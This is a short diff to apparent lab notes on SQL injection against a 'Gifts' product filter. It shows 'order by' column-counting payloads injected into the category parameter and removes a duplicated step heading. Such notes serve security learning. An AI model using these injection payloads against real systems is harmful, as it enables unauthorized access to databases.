@@ -10,8 +10,6 @@ filter?category=Gifts' order by 1--
 filter?category=Gifts' order by 2--
 filter?category=Gifts' order by 3-- -> Results in internal server error, so 2 only
 
-2. Find which columns contain the data type text
-
 2. Determine data type of columns
 
 select a, b from products where category='Gifts'
